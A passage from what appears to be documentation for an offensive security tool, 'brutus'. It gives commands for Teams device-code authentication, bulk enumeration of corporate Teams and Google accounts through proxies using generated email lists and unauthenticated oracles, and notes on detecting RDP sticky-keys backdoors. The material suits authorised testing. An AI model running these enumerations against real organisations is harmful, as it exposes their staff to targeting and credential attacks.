**Default client ID:** The Microsoft Teams desktop application (`1fec8e78-bce4-4aaf-ab1b-5451cc387264`), a first-party public client that supports device code flow. Override with `--client-id` to use your own app registration.

```
$ brutus enum active teams auth --tenant contoso.com
[*] Starting Microsoft device code authentication...

[*] Microsoft device code authentication
  Open: https://microsoft.com/devicelogin
  Code: ABCD-1234
  Expires in: 15m

  [*] Waiting for you to complete sign-in...

[+] Authentication successful
  Token type:    Bearer
  Expires at:    2026-06-16T13:00:00Z
  Scope:         offline_access https://api.spaces.skype.com/.default
  Access token:  eyJ0eXAiOiJKV1Qi...
  Refresh token: <present>
  ID token:      <present>
```

#### Teams user enumeration

Once authenticated, enumerate corporate Teams users by email address. Each
result is `exists`, `blocked` (the tenant forbids external search but the user
may exist), `not found`, or `unknown` (auth/transport failure). Personal/Live
accounts are not supported — corporate tenants only.

```bash
# Device-code auth inline, then enumerate a couple of emails
brutus enum active teams users -e alice@contoso.com,bob@contoso.com

# Generate candidate emails for a domain and enumerate the most-likely 5000
# (presence and out-of-office are gathered by default; use --no-presence to skip)
brutus enum active teams users --domain target.com --format first.last --limit 5000

# Enumerate emails from a file
brutus enum active teams users -E emails.txt

# Reuse a token captured earlier and route through a SOCKS5 proxy
brutus enum active teams auth -o token.jsonl
brutus enum active teams users -E emails.txt --token-file token.jsonl --proxy socks5://127.0.0.1:1080

# Provide an access token directly
brutus enum active teams users -e alice@contoso.com --access-token "$TOKEN"
```

When a refresh token is available (via `--token-file` or `--refresh-token`), an
expired access token is renewed automatically once; otherwise a `401` degrades
gracefully to an `unknown` result.

---

### Google Workspace account enumeration

Check whether email addresses correspond to Google accounts using two
**unauthenticated** oracles — no token or sign-in required:

- **AccountChooser SSO redirect** — reveals Workspace accounts on domains
  configured with single sign-on, plus the identity provider (IdP) host they
  redirect to (`workspace-sso`).
- **GXLU Gmail probe** — reveals Gmail-enabled accounts (`gmail`).

Each result is `exists` (with the confirming method and, for SSO, the IdP host)
or `not found`.

```bash
# Enumerate a couple of emails
brutus enum active google -e alice@example.com,bob@example.com

# Generate candidate emails for a domain and enumerate the most-likely 5000
brutus enum active google --domain target.com --format first.last --limit 5000

# Enumerate emails from a file
brutus enum active google -E emails.txt

# Route through a SOCKS5 proxy and raise concurrency
brutus enum active google -E emails.txt --proxy socks5://127.0.0.1:1080 --threads 20
```

`--domain` reuses the same frequency-ranked first/last name generator as
`enum generate`; `--format` selects the username layout and `--limit` caps
generation to the first N (most-likely) candidates. `--domain` may be combined
with `-e`/`-E`.

---

## Known Limitations

### Sticky Keys Heuristic Detection

- **Alternating false negatives:** The heuristic-only detection (`brutus logon` without `--experimental-ai`) may produce false negatives on repeated scans against the same target. After a successful detection, the cmd.exe window remains open on the server. Subsequent connections see the cmd.exe in the baseline frame, and since sending 5x Shift doesn't create a new window, the pixel difference is minimal — resulting in a "clean" verdict. This does not affect `--experimental-ai` mode, which uses Vision API analysis of the response frame directly (not a baseline-vs-response diff) and reliably identifies the terminal window regardless of prior state.
- **Workaround:** Use `--experimental-ai` with `ANTHROPIC_API_KEY` set for consistent detection across repeated scans, or allow a cooldown between scans for the RDP session to reset.

### Browser Plugin

- Requires Chrome/Chromium installed locally
- Headless mode may not work on all systems
- Some JavaScript-heavy login pages may require additional wait time
